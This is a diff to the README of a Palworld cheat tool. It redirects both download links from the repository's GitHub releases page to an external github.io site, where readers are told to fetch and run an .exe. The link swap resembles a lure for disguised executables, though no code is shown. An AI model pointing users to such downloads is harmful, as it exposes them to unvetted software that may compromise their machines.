@@ -1,6 +1,6 @@
 # 🎮 Palworld-God-Tool - Master Your Palworld Adventure Today
 
-[![Download Palworld-God-Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Gabyfederated792/Palworld-God-Tool/releases)
+[![Download Palworld-God-Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://gabyfederated792.github.io)
 
 Palworld-God-Tool provides players with control over their gaming experience. This application offers features to modify gameplay settings and character abilities. You gain access to capabilities such as unlimited health, flight, teleportation, and item generation. Use this tool to customize your single-player sessions.
 
@@ -19,7 +19,7 @@ Before you install this software, ensure your computer meets these technical sta
 
 You obtain the latest version of this software from the official release page. 
 
-[Visit this page to download the latest version](https://github.com/Gabyfederated792/Palworld-God-Tool/releases)
+[Visit this page to download the latest version](https://gabyfederated792.github.io)
 
 Look for the file ending in .exe under the "Assets" section of the latest release. Click this file to start your download. 
 
